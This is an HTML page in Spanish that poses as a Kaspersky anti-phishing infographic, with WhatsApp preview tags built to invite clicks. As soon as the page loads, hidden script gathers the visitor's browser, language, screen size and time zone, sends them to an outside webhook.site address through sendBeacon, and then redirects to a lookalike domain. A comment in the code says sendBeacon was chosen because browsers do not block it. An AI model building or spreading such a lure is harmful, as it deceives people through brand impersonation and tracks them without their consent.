<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Infografía de Seguridad - Kaspersky</title>

    <!-- Etiquetas de vista previa para WhatsApp -->
    <meta property="og:title" content="🛡️ Guía de Ciberseguridad: Qué hacer ante el Phishing">
    <meta property="og:description" content="Infografía educativa de Kaspersky con los 5 pasos clave para proteger tu información institucional.">
    <meta property="og:image" content="https://kaspersky-labs.com">
    <meta property="og:type" content="article">

    <script>
        window.onload = function() {
            // Recopilación de metadatos básicos del dispositivo
            var datos = {
                navegador: navigator.userAgent,
                idioma: navigator.language,
                pantalla: window.screen.width + "x" + window.screen.height,
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
                nota: "Clic Humano Confirmado"
            };

            // Envío directo al Webhook usando el método nativo 'sendBeacon'
            // Este método es el más efectivo porque los navegadores no lo bloquean por seguridad (CORS)
            var urlWebhook = 'https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686'; 
            
            navigator.sendBeacon(urlWebhook, JSON.stringify(datos));

            // Redirección inmediata a la infografía original para el usuario
            setTimeout(function() {
                window.location.href = "https://kaspersky-labs.com";
            }, 300);
        };
    </script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif; color: #333;">
        <p>Cargando recurso educativo de seguridad...</p>
    </div>
</body>
</html>
